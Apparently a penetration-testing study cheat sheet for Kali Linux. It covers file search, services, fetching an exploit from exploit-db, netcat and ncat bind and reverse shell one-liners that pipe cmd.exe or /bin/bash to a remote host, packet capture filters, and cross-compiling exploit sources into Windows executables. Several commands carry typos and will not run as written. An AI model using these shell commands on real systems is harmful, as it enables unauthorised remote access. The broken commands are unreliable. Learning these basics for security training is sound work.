## Kali basics

### Finding files

Update database ```updatedb```

Three options for searching

1. Locate ```locate file.exe```

2. Which (searches $PATH) ```which filename```

3. Find (recursive search) ```find / -name filename*```

### Services

Start service ```service ssh start```

To enable a service at runtime ```systemctl enable ssh```

HTTP service ```service apache2 start```

### Creating a web server (Kali)

Directory: /var/www/html

Download files directly: ```wget -o exploit.html http://www.exploit-db.com/download/24017```

Ensure server is running" ```systemctl start Apache2```

## Netcat

### Bind Shell

  Bob sets up a netcat listener using nc -nlvp 4444 -e cmd.exe 

  Alice connects to Bob’s machine using nc -nv 10.11.23.33 4444, receives a command prompt (Windows)

### Reverse Shell

  Bob sets up a netcat listener using nc – nlvp 4444

  Alice connects to Bob using nc -nv 192.168.30.35 4444 -e /bin/bash

## Ncat: modern rewrite of netcat with SSL encryption and IP whitelisting

### Secure Bind shell 

  Listener: ```ncat -lvp 4444 -e cmd.exe –allow 192.168.30.5 –ssl```

  Connector: ```ncat -v 10.11.23.33 4444 –ssl```
  
## Wireshark

  Can be figured to listen on spcific interfaces
  
  Traffic can be filtered to specific hosts and ports
  
   Example: ```host 192.168.30.35 and tcp port 4444```
   
## Tcpdump

  Syntax: ```tcpdump -r password_cracking_filtering.pcap```
  
## Cross compiling

### PyInstaller - tool for creating Windows executables from Python scripts

  Install PyWin32 in Windows
  
  Create the standalone executabel
  
  ```python pyinstaller.py -onefile ms11-080.py```
  
### Mingw - Windows cross compiler

  ```apt-get install mingw-w64```
  
  ```i686-w64-mingw32-ggg 646-fixed.c -o 646.exe -lsw2_32```
  
### Wine - Executing Windows programs on Linux

  ```wine 646.exe 10.11.1.35```